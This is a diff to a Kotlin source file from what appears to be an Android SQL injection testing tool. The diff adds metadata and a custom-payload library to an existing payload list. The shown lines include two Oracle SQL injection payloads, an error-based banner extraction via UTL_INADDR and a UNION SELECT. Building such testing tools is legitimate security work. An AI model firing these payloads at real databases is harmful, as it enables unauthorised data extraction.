@@ -1,5 +1,12 @@
 package com.sqliblackboxpro
 
+data class PayloadInfo(
+    val payload: String,
+    val description: String,
+    val category: String,
+    val isCustom: Boolean = false
+)
+
 object SQLPayloads {
     
     // Basic SQL injection payloads for detection
@@ -45,8 +52,8 @@ object SQLPayloads {
     )
     
     val ORACLE_PAYLOADS = listOf(
-        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v$version WHERE ROWNUM=1))--",
-        "' UNION SELECT NULL,BANNER,NULL FROM v$version--"
+        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v\$version WHERE ROWNUM=1))--",
+        "' UNION SELECT NULL,BANNER,NULL FROM v\$version--"
     )
     
     // Data extraction payloads (for MySQL)
@@ -61,5 +68,101 @@ object SQLPayloads {
     fun getAllPayloads(): List<String> {
         return DETECTION_PAYLOADS + MYSQL_PAYLOADS + POSTGRESQL_PAYLOADS + 
                MSSQL_PAYLOADS + ORACLE_PAYLOADS
+    }
+    
+    // Store for custom payloads
+    private val customPayloads = mutableListOf<PayloadInfo>()
+    
+    // Get all payloads with metadata for the library screen
+    fun getAllPayloadInfo(): List<PayloadInfo> {
+        val payloadInfoList = mutableListOf<PayloadInfo>()
+        
+        // Add detection payloads
+        DETECTION_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "Basic SQL injection detection payload",
+                    category = "Detection Payloads"
+                )
+            )
+        }
+        
+        // Add MySQL payloads
+        MYSQL_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "MySQL-specific error-based SQL injection payload",
+                    category = "MySQL Payloads"
+                )
+            )
+        }
+        
+        // Add PostgreSQL payloads
+        POSTGRESQL_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "PostgreSQL-specific SQL injection payload",
+                    category = "PostgreSQL Payloads"
+                )
+            )
+        }
+        
+        // Add MSSQL payloads
+        MSSQL_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "Microsoft SQL Server-specific SQL injection payload",
+                    category = "MSSQL Payloads"
+                )
+            )
+        }
+        
+        // Add Oracle payloads
+        ORACLE_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "Oracle Database-specific SQL injection payload",
+                    category = "Oracle Payloads"
+                )
+            )
+        }
+        
+        // Add data extraction payloads
+        DATA_EXTRACTION_PAYLOADS.forEach { payload ->
+            payloadInfoList.add(
+                PayloadInfo(
+                    payload = payload,
+                    description = "MySQL data extraction payload for extracting database information",
+                    category = "Data Extraction"
+                )
+            )
+        }
+        
+        // Add custom payloads
+        payloadInfoList.addAll(customPayloads)
+        
+        return payloadInfoList
+    }
+    
+    // Add a custom payload
+    fun addCustomPayload(payload: String, description: String, category: String) {
+        customPayloads.add(
+            PayloadInfo(
+                payload = payload,
+                description = description,
+                category = category,
+                isCustom = true
+            )
+        )
+    }
+    
+    // Remove a custom payload
+    fun removeCustomPayload(payload: String) {
+        customPayloads.removeAll { it.payload == payload }
     }
 }
